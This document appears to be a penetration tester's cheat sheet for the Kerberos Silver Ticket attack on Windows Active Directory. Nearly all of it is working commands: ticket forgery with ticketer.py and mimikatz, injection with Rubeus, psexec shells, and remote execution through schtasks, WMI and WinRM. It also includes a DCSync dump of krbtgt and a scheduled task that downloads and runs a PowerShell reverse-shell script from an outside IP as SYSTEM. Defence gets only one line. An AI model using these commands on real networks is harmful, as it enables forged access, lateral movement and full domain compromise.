Silver Ticket
1) The Silver Ticket attack is based on crafting a valid TGS for a service after the NTLM hash for a service is owned
    This way it is possible to gain access to that service by forging a custom TGS as any user.
    In a Silver Ticket attack we have cracked the NTLM hash of a computer account so we can craft a ticket
    to get into that machine with administrator priviledges through the SMB service, it is preferable to forge
    tickets using the AES Kerberos Keys, computer accounts reset their passwords every 30 days.
    What we can basically do is take control over the services in the victims computer and perform different attacks.
    -------------------------------
    Initiating the attack in Linux:
    - python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
    - export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
    - python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
    while changing of course the properties that are just for reference
    -------------------------------
    With windows we can use mimikatz to craft the ticket, inject it with rebeus, and recieve remote shell with psexec
    Initiating the attack in Windows:
    # Create the ticket
    - mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
    # Inject in memory using mimikatz or Rubeus
    - mimikatz.exe "kerberos::ptt ticket.kirbi"
    - .\Rubeus.exe ptt /ticket:ticket.kirbi
    # Obtain a shell
    - .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
    -------------------------------
    # Example using aes key
    - kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
    -------------------------------
    The CIFS service is the service that allow us to access the file system of the victim, we can use the HOST service to create a schtask,
    then to check if it worked we can use "schtasks /S <hostname>", or we can use the HOST and RPCSS service to execute WMI queries,
    and we can test it by running "Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>"
    -------------------------------
    We can mitigate the attack by checking the EventIDs of 4624 (Account logon), 4634 (Account logoff), 4672 (Admin logon)
    -------------------------------
    A table for what services we need to take control of run what:
    Service Type              Service Silver Tickets
    WMI                       HOST, RPCSS
    PowerShell Remoting       HOST, HTTP, Depending on OS also: WSMAN, RPCSS
    WinRM                     HOST, HTTP, In some occasions you can just ask for: WINRM
    Scheduled Tasks           HOST
    Windows File Share,       CIFS
    also psexec               
    LDAP operations,          LDAP
    included DCSync           
    Windows Remote Server     RPCSS, LDAP, CIFS
    Administration Tools        
    Golden Tickets            krbtgt

    With rebeus we can ask for all of the tickets using "/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm"
    -------------------------------
    Abusing service tickets examples:
    For the examples lets imagine we have a ticket that is impersonating the administrator
    CIFS
    with CIFS we can access the C$ and ADMIN$ folders with smb and so copy files from a remote system
    - dir \\vulnerable.computer\C$
    - dir \\vulnerable.computer\ADMIN$
    - copy afile.txt \\vulnerable.computer\C$\Windows\Temp
    we can also get a shell inside the host and execute commnds with psexec

    HOST
    with this permission we can create scheduled tasks and run commands in remote computers
    # Check you have permissions to use schtasks over a remote server
    - schtasks /S some.vuln.pc
    # Create scheduled task, first for exe execution, second for powershell reverse shell download
    - schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
    - schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
    # Check it was successfully created
    - schtasks /query /S some.vuln.pc
    # Run created schtask now
    - schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"

    HOST + RPCSS
    with these we can execute WMI commands
    # Check you have enough privileges
    - Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
    # Execute code
    - Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"
    # You can also use wmic
    - wmic remote.computer.local list full /format:list

    HOST + WSMAN (WinRM)
    with winrm we can access a computer and even get powershell
    - New-PSSession -Name PSC -ComputerName the.computer.name
    - Enter-PSSession PSC

    LDAP
    with LDAP we can dump the DC database with DCSync
    - in mimikatz: "lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt"
